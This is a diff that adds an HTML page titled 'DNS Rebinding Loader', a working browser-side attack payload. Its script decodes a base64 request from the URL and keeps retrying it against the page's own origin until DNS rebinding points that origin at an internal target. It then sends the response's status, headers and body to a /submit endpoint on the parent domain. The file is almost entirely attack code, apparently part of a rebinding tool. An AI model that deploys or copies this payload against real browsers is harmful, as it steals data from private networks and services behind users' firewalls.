@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DNS Rebinding Loader</title>
+</head>
+<style>
+    h2 {
+        font-family: Arial, Helvetica, sans-serif;
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        transform: translate(-50%, -50%);
+    }
+</style>
+<body>
+    <h2>Executing...</h2>
+</body>
+<script>
+    const fetcher = async (method, path, body) => {
+        let r = null;
+        if (body.length > 0) {
+            r = await fetch(`${window.location.origin}${path}`, { method: method, body: body });
+        } else {
+            r = await fetch(`${window.location.origin}${path}`, { method: method });
+        }
+        let headers = "";
+        for (const iterator of r.headers.entries()) {
+            const [key, val] = iterator;
+            headers += `${key}: ${val}\n`;
+        }
+        let text = await r.text();
+        if (text.includes('<h1>Not found</h1><!--not it-->')) {
+            setTimeout(() => { fetcher(method, path, body); }, 1000);
+        } else {
+            let splitted = a = window.location.host.split('.');
+            splitted.shift();
+            fetch(`${window.location.protocol}//${splitted.join('.')}/submit`, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'text/plain'
+                },
+                body: `${r.status} ${r.statusText}\n\n${headers}\n\n${text}`
+            });
+            document.querySelector('h2').textContent = 'Executed!';
+        }
+    };
+    setTimeout(() => {
+        const queryString = decodeURI(window.location.search)
+        .replace('?', '')
+        .split('&')
+        .map(param => param.split('='))
+        .reduce((values, [ key, value ]) => {
+            values[ key ] = value
+            return values
+        }, {});
+        if (queryString.hasOwnProperty('c')) {
+            let [method, path, body] = JSON.parse(atob(decodeURIComponent(queryString['c'])));
+            fetcher(method, path, body); 
+        }
+    }, 1000);
+</script>
+</html>
